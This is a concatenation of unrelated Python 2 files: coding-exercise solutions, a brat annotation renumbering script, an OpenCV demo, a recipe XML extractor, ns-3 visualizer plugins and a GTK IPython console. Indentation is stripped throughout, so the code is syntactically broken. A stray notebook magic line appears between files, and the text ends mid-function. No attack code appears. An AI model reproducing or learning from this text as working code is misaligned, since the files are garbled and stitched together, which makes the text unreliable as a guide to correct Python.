def solve(self, cipher):
M, N, C = cipher
hash_map = {}
for ind, val in enumerate(C):
if val in hash_map:
hash_map[val].append(ind)
else:
hash_map[val] = [ind]
for ind, val in enumerate(C):
target = M - val
if target in hash_map:
i = 0
while i < len(hash_map[target]) and hash_map[target][i] <= ind:
i += 1
if i != len(hash_map[target]):
return "%d %d" % (ind + 1, hash_map[target][i] + 1)
if __name__ == "__main__":
import sys
f = open("1.in", "r")
testcases = int(f.readline().strip())
for t in xrange(testcases):
M = int(f.readline().strip())
N = int(f.readline().strip())
C = map(int, f.readline().strip().split(' '))
cipher = M, N, C
s = "%s\n" % (Solution().solve(cipher))
print s,
from __future__ import with_statement
import sys
import re
DEBUG = True
class Annotation(object):
def __init__(self, id_, type_):
self.id_ = id_
self.type_ = type_
def map_ids(self, idmap):
self.id_ = idmap[self.id_]
class Textbound(Annotation):
def __init__(self, id_, type_, offsets, text):
Annotation.__init__(self, id_, type_)
self.offsets = offsets
self.text = text
def map_ids(self, idmap):
Annotation.map_ids(self, idmap)
def __str__(self):
return "%s\t%s %s\t%s" % (self.id_, self.type_,
' '.join(self.offsets), self.text)
class ArgAnnotation(Annotation):
def __init__(self, id_, type_, args):
Annotation.__init__(self, id_, type_)
self.args = args
def map_ids(self, idmap):
Annotation.map_ids(self, idmap)
mapped = []
for arg in self.args:
key, value = arg.split(':')
value = idmap[value]
mapped.append("%s:%s" % (key, value))
self.args = mapped
class Relation(ArgAnnotation):
def __init__(self, id_, type_, args):
ArgAnnotation.__init__(self, id_, type_, args)
def map_ids(self, idmap):
ArgAnnotation.map_ids(self, idmap)
def __str__(self):
return "%s\t%s %s" % (self.id_, self.type_, ' '.join(self.args))
class Event(ArgAnnotation):
def __init__(self, id_, type_, trigger, args):
ArgAnnotation.__init__(self, id_, type_, args)
self.trigger = trigger
def map_ids(self, idmap):
ArgAnnotation.map_ids(self, idmap)
self.trigger = idmap[self.trigger]
def __str__(self):
return "%s\t%s:%s %s" % (self.id_, self.type_, self.trigger,
' '.join(self.args))
class Attribute(Annotation):
def __init__(self, id_, type_, target, value):
Annotation.__init__(self, id_, type_)
self.target = target
self.value = value
def map_ids(self, idmap):
Annotation.map_ids(self, idmap)
self.target = idmap[self.target]
def __str__(self):
return "%s\t%s %s%s" % (self.id_, self.type_, self.target,
'' if self.value is None else ' '+self.value)
class Normalization(Annotation):
def __init__(self, id_, type_, target, ref, reftext):
Annotation.__init__(self, id_, type_)
self.target = target
self.ref = ref
self.reftext = reftext
def map_ids(self, idmap):
Annotation.map_ids(self, idmap)
self.target = idmap[self.target]
def __str__(self):
return "%s\t%s %s %s\t%s" % (self.id_, self.type_, self.target,
self.ref, self.reftext)
class Equiv(Annotation):
def __init__(self, id_, type_, targets):
Annotation.__init__(self, id_, type_)
self.targets = targets
def map_ids(self, idmap):
Annotation.map_ids(self, idmap)
self.targets = [idmap[target] for target in self.targets]
def __str__(self):
return "%s\t%s %s" % (self.id_, self.type_, ' '.join(self.targets))
class Note(Annotation):
def __init__(self, id_, type_, target, text):
Annotation.__init__(self, id_, type_)
self.target = target
self.text = text
def map_ids(self, idmap):
Annotation.map_ids(self, idmap)
self.target = idmap[self.target]
def __str__(self):
return "%s\t%s %s\t%s" % (self.id_, self.type_, self.target, self.text)
def parse_textbound(fields):
id_, type_offsets, text = fields
type_offsets = type_offsets.split(' ')
type_, offsets = type_offsets[0], type_offsets[1:]
return Textbound(id_, type_, offsets, text)
def parse_relation(fields):
id_, type_args = fields
type_args = type_args.split(' ')
type_, args = type_args[0], type_args[1:]
return Relation(id_, type_, args)
def parse_event(fields):
id_, type_trigger_args = fields
type_trigger_args = type_trigger_args.split(' ')
type_trigger, args = type_trigger_args[0], type_trigger_args[1:]
type_, trigger = type_trigger.split(':')
args = [a for a in args if a]
return Event(id_, type_, trigger, args)
def parse_attribute(fields):
id_, type_target_value = fields
type_target_value = type_target_value.split(' ')
if len(type_target_value) == 3:
type_, target, value = type_target_value
else:
type_, target = type_target_value
value = None
return Attribute(id_, type_, target, value)
def parse_normalization(fields):
id_, type_target_ref, reftext = fields
type_, target, ref = type_target_ref.split(' ')
return Normalization(id_, type_, target, ref, reftext)
def parse_note(fields):
id_, type_target, text = fields
type_, target = type_target.split(' ')
return Note(id_, type_, target, text)
def parse_equiv(fields):
id_, type_targets = fields
type_targets = type_targets.split(' ')
type_, targets = type_targets[0], type_targets[1:]
return Equiv(id_, type_, targets)
parse_func = {
'T': parse_textbound,
'R': parse_relation,
'E': parse_event,
'N': parse_normalization,
'M': parse_attribute,
'A': parse_attribute,
'#': parse_note,
'*': parse_equiv,
}
def parse(l, ln):
assert len(l) and l[0] in parse_func, "Error on line %d: %s" % (ln, l)
try:
return parse_func[l[0]](l.split('\t'))
except Exception:
assert False, "Error on line %d: %s" % (ln, l)
def process(fn):
idmap = {}
with open(fn, "rU") as f:
lines = [l.rstrip('\n') for l in f.readlines()]
annotations = []
for i, l in enumerate(lines):
annotations.append(parse(l, i+1))
if DEBUG:
for i, a in enumerate(annotations):
assert lines[i] == str(a), ("Cross-check failed:\n  "+
'"%s"' % lines[i] + " !=\n  "+
'"%s"' % str(a))
idmap = {}
next_free = {}
idmap['*'] = '*'
for i, a in enumerate(annotations):
if a.id_ == '*':
continue
assert a.id_ not in idmap, "Dup ID on line %d: %s" % (i, l)
prefix = a.id_[0]
seq = next_free.get(prefix, 1)
idmap[a.id_] = prefix+str(seq)
next_free[prefix] = seq+1
for i, a in enumerate(annotations):
a.map_ids(idmap)
print(a)
def main(argv):
if len(argv) < 2:
print >> sys.stderr, "Usage:", argv[0], "FILE [FILE ...]"
return 1
for fn in argv[1:]:
process(fn)
return 0
if __name__ == "__main__":
sys.exit(main(sys.argv))
import cv2
import numpy as np
def imshow(mat, img_name="Image Name"):
cv2.imshow(img_name, mat)
cv2.waitKey(0)
cv2.destroyAllWindows()
def random_img(size=(400, 400)):
mat = np.random.randint(0, 255, size)
mat = np.asarray(mat, dtype=np.int8)
return mat
def blurred_img(size=(400, 400)):
mat = random_img(size)
kernel = cv2.getGaussianKernel(129, 7)
mat = cv2.filter2D(mat, cv2.CV_8UC3, kernel)
mat = np.asarray(mat, dtype=np.int8)
return mat
if __name__ == "__main__":
imshow(random_img())
imshow(blurred_img())
class TreeNode:
def __init__(self, val):
self.val = val
self.left, self.right = None, None
class Solution:
def __init__(self, root):
self.stk = []
self.cur = root
def hasNext(self):
return self.cur or self.stk
def next(self):
if not self.hasNext():
return None
while self.cur:
self.stk.append(self.cur)
self.cur = self.cur.left
node = self.stk.pop()
self.cur = node.right
return node
class Queue:
def __init__(self):
self.in_stk = []
self.out_stk = []
def push(self, element):
self.in_stk.append(element)
def top(self):
if not self.out_stk:
while self.in_stk:
self.out_stk.append(self.in_stk.pop())
return self.out_stk[-1]
def pop(self):
if not self.out_stk:
while self.in_stk:
self.out_stk.append(self.in_stk.pop())
return self.out_stk.pop()
import os
import re
class InfoExtraction(object):
def __init__(self):
self.p_amount = "<Amount>(?P<amount>[^<]+)</Amount>"
self.p_ingredient = "<Ingredient>(?P<ingredient>[^<]+)</Ingredient>"
self.p_unit = "<Unit>(?P<unit>[^<]+)</Unit>"
self.p_recipe = "<Recipe>(?P<recipe>[^<]+)</Recipe>"
def extract_directory(self, top, func_name, callback=None):
for root, dirs, files in os.walk(top):
for file_name in files:
if file_name.endswith(".xml"):
if not callback:
self.extract_file(os.path.join(root, file_name), func_name)
else:
callback(self.extract_file(os.path.join(root, file_name), func_name))
def extract_file(self, file_path, func_name):
import codecs
with codecs.open(file_path, 'r') as tagged_file:
content = tagged_file.read()
content = self.pre_format(content)
if func_name=="relation":
return self.extract_relation(content)
elif func_name=="set":
return self.extract_set(content)
else:
print "Error: func_name should one from [set, relation"
def extract_relation(self, content):
p1 = re.compile("[^<]{0,50}".join([self.p_amount, self.p_ingredient]))
p2 = re.compile("[^<]{0,50}".join([self.p_amount, self.p_unit, self.p_ingredient]))
p3 = re.compile("[^<]{0,10}".join([self.p_amount, "<Ingredient>([^<]+)</Ingredient>[^<]", self.p_ingredient]))
p4 = re.compile("[^<]{0,10}".join([self.p_amount, "<Ingredient>([^<]+)</Ingredient>[^<]","<Ingredient>([^<]+)</Ingredient>[^<]", self.p_ingredient]))
p5 = re.compile("[^<]{0,10}".join([self.p_amount, "<Ingredient>([^<]+)</Ingredient>[^<]","<Ingredient>([^<]+)</Ingredient>[^<]","<Ingredient>([^<]+)</Ingredient>[^<]", self.p_ingredient]))
p6 = re.compile("[^<]{0,10}".join([self.p_amount, self.p_unit,"<Ingredient>([^<]+)</Ingredient>[^<]", self.p_ingredient]))
p7 = re.compile("[^<]{0,10}".join([self.p_amount, self.p_unit,"<Ingredient>([^<]+)</Ingredient>[^<]","<Ingredient>([^<]+)</Ingredient>[^<]", self.p_ingredient]))
p8 = re.compile("[^<]{0,10}".join([self.p_amount, self.p_unit,"<Ingredient>([^<]+)</Ingredient>[^<]","<Ingredient>([^<]+)</Ingredient>[^<]","<Ingredient>([^<]+)</Ingredient>[^<]", self.p_ingredient]))
patterns = [p1,p2,p3,p4,p5,p6,p7,p8]
result_set = set()
for p in patterns:
mg = p.finditer(content.decode("utf-8"))
for m in mg:
result_set.add(str(m.groupdict()).decode("utf-8"))
return result_set
def extract_set(self, content):
tag_regex = dict()
tag_regex['recipe']=re.compile(self.p_recipe)
tag_regex['ingredient']=re.compile(self.p_ingredient)
tag_regex['unit']=re.compile(self.p_unit)
tag_regex['amount']=re.compile(self.p_amount)
set_group = dict()
for tag,tag_re in tag_regex.items():
result = tag_re.findall(content)
set_group[tag] = set(result)
return set_group
def pre_format(self, content):
content = re.sub("<entity type=\"(\w+)\">([^<]+)</entity>", "<\g<1>>\g<2></\g<1>>", content)
content = content.replace("<s>", "")
content = content.replace("</B-Ingredient> <I-Ingredient>", " ")
content = content.replace("</I-Ingredient> <I-Ingredient>", " ")
content = content.replace("</B-Recipe> <I-Recipe>", " ")
content = content.replace("</I-Recipe> <I-Recipe>", " ")
content = content.replace("</B-Amount> <I-Amount>", " ")
content = content.replace("</I-Amount> <I-Amount>", " ")
content = content.replace("</B-Unit> <I-Unit>", " ")
content = content.replace("</I-Unit> <I-Unit>", " ")
content = content.replace("</I-", "</")
content = content.replace("</B-", "</")
content = content.replace("<B-", "<")
content = content.replace("<I-", "<")
return content
if __name__ == '__main__':
info_extraction = InfoExtraction()
current_directory = os.path.dirname(os.path.realpath(__file__))
current_directory = os.path.join(current_directory)
info_extraction.extract_directory(current_directory, "relation")
class TreeNode:
def __init__(self, val):
self.val = val
self.left, self.right = None, None
class Solution:
def insertNode(self, root, node):
cur = root
if not root:
root = node
return root
while cur:
if cur.val == node.val:
return root
elif cur.val > node.val:
if cur.left:
cur = cur.left
else:
cur.left = node
return root
else:
if cur.right:
cur = cur.right
else:
cur.right = node
return root
import copy_reg
import types
def reduce_method(m):
return (getattr, (m.__self__, m.__func__.__name__))
copy_reg.pickle(types.MethodType, reduce_method)
import gtk
import ns.core
import ns.network
from visualizer.base import InformationWindow
NODE_STATISTICS_MEMORY = 10
class StatisticsCollector(object):
class NetDevStats(object):
__slots__ = ['rxPackets', 'rxBytes', 'txPackets', 'txBytes',
'rxPacketRate', 'rxBitRate', 'txPacketRate', 'txBitRate']
def __init__(self, visualizer):
self.node_statistics = {}
self.visualizer = visualizer
def simulation_periodic_update(self, viz):
nodes_statistics = viz.simulation.sim_helper.GetNodesStatistics()
for stats in nodes_statistics:
try:
raw_stats_list = self.node_statistics[stats.nodeId]
except KeyError:
raw_stats_list = []
self.node_statistics[stats.nodeId] = raw_stats_list
raw_stats_list.append(stats.statistics)
while len(raw_stats_list) > NODE_STATISTICS_MEMORY:
raw_stats_list.pop(0)
def get_interface_statistics(self, nodeId):
try:
raw_stats_list = self.node_statistics[nodeId]
except KeyError:
return []
if len(raw_stats_list) < NODE_STATISTICS_MEMORY:
return []
assert len(raw_stats_list) == NODE_STATISTICS_MEMORY
tx_packets1 = []
rx_packets1 = []
tx_bytes1 = []
rx_bytes1 = []
for iface, stats in enumerate(raw_stats_list[0]):
tx_packets1.append(stats.transmittedPackets)
tx_bytes1.append(stats.transmittedBytes)
rx_packets1.append(stats.receivedPackets)
rx_bytes1.append(stats.receivedBytes)
retval = []
k = self.visualizer.sample_period*(NODE_STATISTICS_MEMORY-1)
for iface, stats in enumerate(raw_stats_list[-1]):
outStat = self.NetDevStats()
outStat.txPackets = stats.transmittedPackets
outStat.txBytes = stats.transmittedBytes
outStat.rxPackets = stats.receivedPackets
outStat.rxBytes = stats.receivedBytes
outStat.txPacketRate = (stats.transmittedPackets - tx_packets1[iface])/k
outStat.rxPacketRate = (stats.receivedPackets - rx_packets1[iface])/k
outStat.txBitRate = (stats.transmittedBytes - tx_bytes1[iface])*8/k
outStat.rxBitRate = (stats.receivedBytes - rx_bytes1[iface])*8/k
retval.append(outStat)
return retval
class ShowInterfaceStatistics(InformationWindow):
(
COLUMN_INTERFACE,
COLUMN_TX_PACKETS,
COLUMN_TX_BYTES,
COLUMN_TX_PACKET_RATE,
COLUMN_TX_BIT_RATE,
COLUMN_RX_PACKETS,
COLUMN_RX_BYTES,
COLUMN_RX_PACKET_RATE,
COLUMN_RX_BIT_RATE,
) = range(9)
def __init__(self, visualizer, node_index, statistics_collector):
InformationWindow.__init__(self)
self.win = gtk.Dialog(parent=visualizer.window,
flags=gtk.DIALOG_DESTROY_WITH_PARENT|gtk.DIALOG_NO_SEPARATOR,
buttons=(gtk.STOCK_CLOSE, gtk.RESPONSE_CLOSE))
self.win.connect("response", self._response_cb)
self.win.set_title("Statistics for node %i" % node_index)
self.visualizer = visualizer
self.statistics_collector = statistics_collector
self.node_index = node_index
self.viz_node = visualizer.get_node(node_index)
self.table_model = gtk.ListStore(*([str]*13))
treeview = gtk.TreeView(self.table_model)
treeview.show()
self.win.vbox.add(treeview)
def add_column(descr, colid):
column = gtk.TreeViewColumn(descr, gtk.CellRendererText(), text=colid)
treeview.append_column(column)
add_column("Interface", self.COLUMN_INTERFACE)
add_column("Tx Packets", self.COLUMN_TX_PACKETS)
add_column("Tx Bytes", self.COLUMN_TX_BYTES)
add_column("Tx pkt/1s", self.COLUMN_TX_PACKET_RATE)
add_column("Tx bit/1s", self.COLUMN_TX_BIT_RATE)
add_column("Rx Packets", self.COLUMN_RX_PACKETS)
add_column("Rx Bytes", self.COLUMN_RX_BYTES)
add_column("Rx pkt/1s", self.COLUMN_RX_PACKET_RATE)
add_column("Rx bit/1s", self.COLUMN_RX_BIT_RATE)
self.visualizer.add_information_window(self)
self.win.show()
def _response_cb(self, win, response):
self.win.destroy()
self.visualizer.remove_information_window(self)
def update(self):
node = ns.network.NodeList.GetNode(self.node_index)
stats_list = self.statistics_collector.get_interface_statistics(self.node_index)
self.table_model.clear()
for iface, stats in enumerate(stats_list):
tree_iter = self.table_model.append()
netdevice = node.GetDevice(iface)
interface_name = ns.core.Names.FindName(netdevice)
if not interface_name:
interface_name = "(interface %i)" % iface
self.table_model.set(tree_iter,
self.COLUMN_INTERFACE, interface_name,
self.COLUMN_TX_PACKETS, str(stats.txPackets),
self.COLUMN_TX_BYTES, str(stats.txBytes),
self.COLUMN_TX_PACKET_RATE, str(stats.txPacketRate),
self.COLUMN_TX_BIT_RATE, str(stats.txBitRate),
self.COLUMN_RX_PACKETS, str(stats.rxPackets),
self.COLUMN_RX_BYTES, str(stats.rxBytes),
self.COLUMN_RX_PACKET_RATE, str(stats.rxPacketRate),
self.COLUMN_RX_BIT_RATE, str(stats.rxBitRate)
)
def populate_node_menu(viz, node, menu, statistics_collector):
menu_item = gtk.MenuItem("Show Interface Statistics")
menu_item.show()
def _show_it(dummy_menu_item):
ShowInterfaceStatistics(viz, node.node_index, statistics_collector)
menu_item.connect("activate", _show_it)
menu.add(menu_item)
def register(viz):
statistics_collector = StatisticsCollector(viz)
viz.connect("populate-node-menu", populate_node_menu, statistics_collector)
viz.connect("simulation-periodic-update", statistics_collector.simulation_periodic_update)
class Solution(object):
def rerange(self, A):
n = len(A)
pos_cnt = len(filter(lambda x: x > 0, A))
pos_expt = True if pos_cnt*2 > n else False
neg = 0
pos = 0
for i in xrange(n):
while neg < n and A[neg] > 0: neg += 1
while pos < n and A[pos] < 0: pos += 1
if pos_expt:
A[i], A[pos] = A[pos], A[i]
else:
A[i], A[neg] = A[neg], A[i]
if i == neg: neg += 1
if i == pos: pos += 1
pos_expt = not pos_expt
if __name__ == "__main__":
A = [-33, -19, 30, 26, 21, -9]
Solution().rerange(A)
assert A == [-33, 30, -19, 26, -9, 21]
import sys
DEFAULT = sys.maxint
f = lambda x, y: min(x, y)
class Node(object):
def __init__(self, start, end, m):
self.start, self.end, self.m = start, end, m
self.left, self.right = None, None
class SegmentTree(object):
def __init__(self, A):
self.A = A
self.root = self.build_tree(0, len(self.A))
def build_tree(self, s, e):
if s >= e:
return None
if s+1 == e:
return Node(s, e, self.A[s])
left = self.build_tree(s, (s+e)/2)
right = self.build_tree((s+e)/2, e)
val = DEFAULT
if left: val = f(val, left.m)
if right: val = f(val, right.m)
root = Node(s, e, val)
root.left = left
root.right = right
return root
def query(self, root, s, e):
if not root:
return DEFAULT
if s <= root.start and e >= root.end:
return root.m
if s >= root.end or e <= root.start:
return DEFAULT
l = self.query(root.left, s, e)
r = self.query(root.right, s, e)
return f(l, r)
class Solution:
def intervalMinNumber(self, A, queries):
ret = []
tree = SegmentTree(A)
for q in queries:
ret.append(tree.query(tree.root, q.start, q.end+1))
return ret
DEFAULT = 0
f = lambda x, y: x+y
class Node(object):
def __init__(self, start, end, m):
self.start, self.end, self.m = start, end, m
self.left, self.right = None, None
class SegmentTree(object):
def __init__(self, A):
self.A = A
self.root = self.build_tree(0, len(self.A))
def build_tree(self, s, e):
if s >= e:
return None
if s+1 == e:
return Node(s, e, self.A[s])
left = self.build_tree(s, (s+e)/2)
right = self.build_tree((s+e)/2, e)
val = DEFAULT
if left: val = f(val, left.m)
if right: val = f(val, right.m)
root = Node(s, e, val)
root.left = left
root.right = right
return root
def query(self, root, s, e):
if not root:
return DEFAULT
if s <= root.start and e >= root.end:
return root.m
if s >= root.end or e <= root.start:
return DEFAULT
l = self.query(root.left, s, e)
r = self.query(root.right, s, e)
return f(l, r)
def modify(self, root, idx, val):
if not root or idx >= root.end or idx < root.start:
return
if idx == root.start and idx == root.end-1:
root.m = val
self.A[idx] = val
return
self.modify(root.left, idx, val)
self.modify(root.right, idx, val)
val = DEFAULT
if root.left: val = f(val, root.left.m)
if root.right: val = f(val, root.right.m)
root.m = val
class Solution:
def __init__(self, A):
self.tree = SegmentTree(A)
def query(self, start, end):
return self.tree.query(self.tree.root, start, end+1)
def modify(self, index, value):
self.tree.modify(self.tree.root, index, value)
DEFAULT = 0
f = lambda x, y: x+y
class Node(object):
def __init__(self, start, end, m):
self.start, self.end, self.m = start, end, m
self.left, self.right = None, None
class SegmentTree(object):
def __init__(self, A):
self.A = A
self.root = self.build_tree(0, len(self.A))
def build_tree(self, s, e):
if s >= e:
return None
if s+1 == e:
return Node(s, e, self.A[s])
left = self.build_tree(s, (s+e)/2)
right = self.build_tree((s+e)/2, e)
val = DEFAULT
if left: val = f(val, left.m)
if right: val = f(val, right.m)
root = Node(s, e, val)
root.left = left
root.right = right
return root
def query(self, root, s, e):
if not root:
return DEFAULT
if s <= root.start and e >= root.end:
return root.m
if s >= root.end or e <= root.start:
return DEFAULT
l = self.query(root.left, s, e)
r = self.query(root.right, s, e)
return f(l, r)
class Solution:
def intervalSum(self, A, queries):
ret = []
tree = SegmentTree(A)
for q in queries:
ret.append(tree.query(tree.root, q.start, q.end+1))
return ret
import sys
class IOStreamer(object):
@staticmethod
def stdinlines():
for line in sys.stdin.readlines():
yield line.strip()
import gtk
import ns.core
import ns.network
import ns.internet
from visualizer.base import InformationWindow
class ShowIpv4RoutingTable(InformationWindow):
(
COLUMN_DESTINATION,
COLUMN_NEXT_HOP,
COLUMN_INTERFACE,
COLUMN_TYPE,
COLUMN_PRIO
) = range(5)
def __init__(self, visualizer, node_index):
InformationWindow.__init__(self)
self.win = gtk.Dialog(parent=visualizer.window,
flags=gtk.DIALOG_DESTROY_WITH_PARENT|gtk.DIALOG_NO_SEPARATOR,
buttons=(gtk.STOCK_CLOSE, gtk.RESPONSE_CLOSE))
self.win.connect("response", self._response_cb)
self.win.set_title("IPv4 routing table for node %i" % node_index)
self.visualizer = visualizer
self.node_index = node_index
self.table_model = gtk.ListStore(str, str, str, str, int)
treeview = gtk.TreeView(self.table_model)
treeview.show()
sw = gtk.ScrolledWindow()
sw.set_properties(hscrollbar_policy=gtk.POLICY_AUTOMATIC,
vscrollbar_policy=gtk.POLICY_AUTOMATIC)
sw.show()
sw.add(treeview)
self.win.vbox.add(sw)
self.win.set_default_size(600, 300)
column = gtk.TreeViewColumn('Destination', gtk.CellRendererText(),
text=self.COLUMN_DESTINATION)
treeview.append_column(column)
column = gtk.TreeViewColumn('Next hop', gtk.CellRendererText(),
text=self.COLUMN_NEXT_HOP)
treeview.append_column(column)
column = gtk.TreeViewColumn('Interface', gtk.CellRendererText(),
text=self.COLUMN_INTERFACE)
treeview.append_column(column)
column = gtk.TreeViewColumn('Type', gtk.CellRendererText(),
text=self.COLUMN_TYPE)
treeview.append_column(column)
column = gtk.TreeViewColumn('Prio', gtk.CellRendererText(),
text=self.COLUMN_PRIO)
treeview.append_column(column)
self.visualizer.add_information_window(self)
self.win.show()
def _response_cb(self, win, response):
self.win.destroy()
self.visualizer.remove_information_window(self)
def update(self):
node = ns.network.NodeList.GetNode(self.node_index)
ipv4 = node.GetObject(ns.internet.Ipv4.GetTypeId())
routing = ipv4.GetRoutingProtocol()
if routing is None:
return
routing_protocols = []
if isinstance(routing, ns.internet.Ipv4StaticRouting):
ipv4_routing = routing_protocols.append((routing, "static", 0))
elif isinstance(routing, ns.internet.Ipv4ListRouting):
list_routing = routing
for rI in range(list_routing.GetNRoutingProtocols()):
routing, prio = list_routing.GetRoutingProtocol(rI)
if isinstance(routing, ns.internet.Ipv4StaticRouting):
routing_protocols.append((routing, "static", prio))
elif isinstance(routing, ns.internet.Ipv4GlobalRouting):
routing_protocols.append((routing, "global", prio))
if not routing_protocols:
return
self.table_model.clear()
for route_proto, type_string, prio in routing_protocols:
for routeI in range(route_proto.GetNRoutes()):
route = route_proto.GetRoute(routeI)
tree_iter = self.table_model.append()
netdevice = ipv4.GetNetDevice(route.GetInterface())
if netdevice is None:
interface_name = 'lo'
else:
interface_name = ns.core.Names.FindName(netdevice)
if not interface_name:
interface_name = "(interface %i)" % route.GetInterface()
self.table_model.set(tree_iter,
self.COLUMN_DESTINATION, str(route.GetDest()),
self.COLUMN_NEXT_HOP, str(route.GetGateway()),
self.COLUMN_INTERFACE, interface_name,
self.COLUMN_TYPE, type_string,
self.COLUMN_PRIO, prio)
def populate_node_menu(viz, node, menu):
menu_item = gtk.MenuItem("Show IPv4 Routing Table")
menu_item.show()
def _show_ipv4_routing_table(dummy_menu_item):
ShowIpv4RoutingTable(viz, node.node_index)
menu_item.connect("activate", _show_ipv4_routing_table)
menu.add(menu_item)
def register(viz):
viz.connect("populate-node-menu", populate_node_menu)
%config IPCompleter.greedy=True
import gtk
import re
import sys
import os
import pango
from StringIO import StringIO
import IPython
ansi_colors =  {'0;30': 'Black',
'0;31': 'Red',
'0;32': 'Green',
'0;33': 'Brown',
'0;34': 'Blue',
'0;35': 'Purple',
'0;36': 'Cyan',
'0;37': 'LightGray',
'1;30': 'DarkGray',
'1;31': 'DarkRed',
'1;32': 'SeaGreen',
'1;33': 'Yellow',
'1;34': 'LightBlue',
'1;35': 'MediumPurple',
'1;36': 'LightCyan',
'1;37': 'White'}
class IterableIPShell:
def __init__(self,argv=None,user_ns=None,user_global_ns=None,
cin=None, cout=None,cerr=None, input_func=None):
if input_func:
IPython.iplib.raw_input_original = input_func
if cin:
IPython.Shell.Term.cin = cin
if cout:
IPython.Shell.Term.cout = cout
if cerr:
IPython.Shell.Term.cerr = cerr
if argv is None:
argv=[]
IPython.iplib.raw_input = lambda x: None
self.term = IPython.genutils.IOTerm(cin=cin, cout=cout, cerr=cerr)
os.environ['TERM'] = 'dumb'
excepthook = sys.excepthook
self.IP = IPython.Shell.make_IPython(argv,user_ns=user_ns,
user_global_ns=user_global_ns,
embedded=True,
shell_class=IPython.Shell.InteractiveShell)
self.IP.system = lambda cmd: self.shell(self.IP.var_expand(cmd),
header='IPython system call: ',
verbose=self.IP.rc.system_verbose)
sys.excepthook = excepthook
self.iter_more = 0
self.history_level = 0
self.complete_sep =  re.compile('[\s\{\}\[\]\(\)]')
def execute(self):
self.history_level = 0
orig_stdout = sys.stdout
sys.stdout = IPython.Shell.Term.cout
try:
line = self.IP.raw_input(None, self.iter_more)
if self.IP.autoindent:
self.IP.readline_startup_hook(None)
except KeyboardInterrupt:
self.IP.write('\nKeyboardInterrupt\n')
self.IP.resetbuffer()
self.IP.outputcache.prompt_count -= 1
if self.IP.autoindent:
self.IP.indent_current_nsp = 0
self.iter_more = 0
except:
self.IP.showtraceback()
else:
self.iter_more = self.IP.push(line)
if (self.IP.SyntaxTB.last_syntax_error and
self.IP.rc.autoedit_syntax):
self.IP.edit_syntax_error()
if self.iter_more:
self.prompt = str(self.IP.outputcache.prompt2).strip()
if self.IP.autoindent:
self.IP.readline_startup_hook(self.IP.pre_readline)
else:
self.prompt = str(self.IP.outputcache.prompt1).strip()
sys.stdout = orig_stdout
def historyBack(self):
self.history_level -= 1
return self._getHistory()
def historyForward(self):
self.history_level += 1
return self._getHistory()
def _getHistory(self):
try:
rv = self.IP.user_ns['In'][self.history_level].strip('\n')
except IndexError:
self.history_level = 0
rv = ''
return rv
def updateNamespace(self, ns_dict):
self.IP.user_ns.update(ns_dict)
def complete(self, line):
split_line = self.complete_sep.split(line)
possibilities = self.IP.complete(split_line[-1])
if possibilities:
common_prefix = reduce(self._commonPrefix, possibilities)
completed = line[:-len(split_line[-1])]+common_prefix
else:
completed = line
return completed, possibilities
def _commonPrefix(self, str1, str2):
for i in range(len(str1)):
if not str2.startswith(str1[:i+1]):
return str1[:i]
return str1
def shell(self, cmd,verbose=0,debug=0,header=''):
stat = 0
if verbose or debug: print header+cmd
if not debug:
input, output = os.popen4(cmd)
print output.read()
output.close()
input.close()
class ConsoleView(gtk.TextView):
def __init__(self):
gtk.TextView.__init__(self)
self.modify_font(pango.FontDescription('Mono'))
self.set_cursor_visible(True)
self.text_buffer = self.get_buffer()
self.mark = self.text_buffer.create_mark('scroll_mark',
self.text_buffer.get_end_iter(),
False)
for code in ansi_colors:
self.text_buffer.create_tag(code,
foreground=ansi_colors[code],
weight=700)
self.text_buffer.create_tag('0')
self.text_buffer.create_tag('notouch', editable=False)
self.color_pat = re.compile('\x01?\x1b\[(.*?)m\x02?')
self.line_start = \
self.text_buffer.create_mark('line_start',
self.text_buffer.get_end_iter(), True
)
self.connect('key-press-event', self._onKeypress)
self.last_cursor_pos = 0
def write(self, text, editable=False):
segments = self.color_pat.split(text)
segment = segments.pop(0)
start_mark = self.text_buffer.create_mark(None,
self.text_buffer.get_end_iter(),
True)
self.text_buffer.insert(self.text_buffer.get_end_iter(), segment)
if segments:
ansi_tags = self.color_pat.findall(text)
for tag in ansi_tags:
i = segments.index(tag)
self.text_buffer.insert_with_tags_by_name(self.text_buffer.get_end_iter(),
segments[i+1], tag)
segments.pop(i)
if not editable:
self.text_buffer.apply_tag_by_name('notouch',
self.text_buffer.get_iter_at_mark(start_mark),
self.text_buffer.get_end_iter())
self.text_buffer.delete_mark(start_mark)
self.scroll_mark_onscreen(self.mark)
def showPrompt(self, prompt):
self.write(prompt)
self.text_buffer.move_mark(self.line_start,self.text_buffer.get_end_iter())
def changeLine(self, text):
iter = self.text_buffer.get_iter_at_mark(self.line_start)
iter.forward_to_line_end()
self.text_buffer.delete(self.text_buffer.get_iter_at_mark(self.line_start), iter)
self.write(text, True)
def getCurrentLine(self):
rv = self.text_buffer.get_slice(self.text_buffer.get_iter_at_mark(self.line_start),
self.text_buffer.get_end_iter(), False)
return rv
def showReturned(self, text):
iter = self.text_buffer.get_iter_at_mark(self.line_start)
iter.forward_to_line_end()
self.text_buffer.apply_tag_by_name('notouch',
self.text_buffer.get_iter_at_mark(self.line_start),
iter)
self.write('\n'+text)
if text:
self.write('\n')
self.showPrompt(self.prompt)
self.text_buffer.move_mark(self.line_start,self.text_buffer.get_end_iter())
self.text_buffer.place_cursor(self.text_buffer.get_end_iter())
def _onKeypress(self, obj, event):
if not event.string:
return
insert_mark = self.text_buffer.get_insert()
insert_iter = self.text_buffer.get_iter_at_mark(insert_mark)
selection_mark = self.text_buffer.get_selection_bound()
selection_iter = self.text_buffer.get_iter_at_mark(selection_mark)
start_iter = self.text_buffer.get_iter_at_mark(self.line_start)
if start_iter.compare(insert_iter) <= 0 and \
start_iter.compare(selection_iter) <= 0:
return
elif start_iter.compare(insert_iter) > 0 and \
start_iter.compare(selection_iter) > 0:
self.text_buffer.place_cursor(start_iter)
elif insert_iter.compare(selection_iter) < 0:
self.text_buffer.move_mark(insert_mark, start_iter)
elif insert_iter.compare(selection_iter) > 0:
self.text_buffer.move_mark(selection_mark, start_iter)
class IPythonView(ConsoleView, IterableIPShell):
def __init__(self):
ConsoleView.__init__(self)
self.cout = StringIO()
IterableIPShell.__init__(self, cout=self.cout,cerr=self.cout,
input_func=self.raw_input)
self.connect('key_press_event', self.keyPress)
self.execute()
self.cout.truncate(0)
self.showPrompt(self.prompt)
self.interrupt = False
def raw_input(self, prompt=''):
if self.interrupt:
self.interrupt = False
raise KeyboardInterrupt
return self.getCurrentLine()
def keyPress(self, widget, event):
if event.state & gtk.gdk.CONTROL_MASK and event.keyval == 99:
